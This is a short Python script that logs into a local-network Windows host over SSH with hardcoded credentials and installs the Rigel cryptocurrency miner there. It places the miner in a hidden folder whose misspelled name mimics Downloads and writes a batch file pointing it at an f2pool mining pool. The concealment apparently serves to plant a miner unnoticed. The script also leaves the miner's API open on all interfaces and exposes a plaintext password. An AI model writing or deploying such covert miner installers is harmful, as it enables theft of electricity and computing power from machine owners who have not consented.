import paramiko, os, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('192.168.3.7', username='sydrro_ssh', password='061021', timeout=10)

# Create hidden directory
remote_dir = r'D:\Donwlaods\rigel-1.23.1-win'
ssh.exec_command('cmd /c "mkdir D:\\Donwlaods 2>nul"')
ssh.exec_command('cmd /c "mkdir ' + remote_dir + ' 2>nul"')
ssh.exec_command('cmd /c "mkdir ' + remote_dir + '\\logs 2>nul"')
# Hide the folder
ssh.exec_command('cmd /c "attrib +h D:\\Donwlaods"')
time.sleep(1)
print('Directory created and hidden')

# Upload required files from local
local_dir = r'D:\rigel-1.23.1-win'
files = ['rigel.exe', 'cfx.bat', 'README.md']

sftp = ssh.open_sftp()
for f in files:
    local_path = os.path.join(local_dir, f)
    remote_path = remote_dir.replace('\\', '/') + '/' + f
    print(f'Uploading {f} ({os.path.getsize(local_path)} bytes)...')
    sftp.put(local_path, remote_path)

# Create a.bat with config for 002
bat_content = '@echo off\r\ncd /d "%~dp0"\r\nrigel.exe -a octopus -o stratum+tcp://cfx.f2pool.com:6800 -u sydrro.5070ti --api-bind 0.0.0.0:5002 --log-file logs/miner.log\r\n'
a_bat = remote_dir.replace('\\', '/') + '/a.bat'
f = sftp.open(a_bat, 'w')
f.write(bat_content)
f.close()
sftp.close()
print('a.bat written')

# Verify
stdin, stdout, stderr = ssh.exec_command('cmd /c "dir /b ' + remote_dir + '"')
print('Files:', stdout.read().decode('gbk', errors='replace').strip())

stdin, stdout, stderr = ssh.exec_command('cmd /c "dir D:\\Donwlaods /a"')
print('Folder:', stdout.read().decode('gbk', errors='replace').strip())

ssh.close()
print('Done! Rigel installed on 002 (not running).')
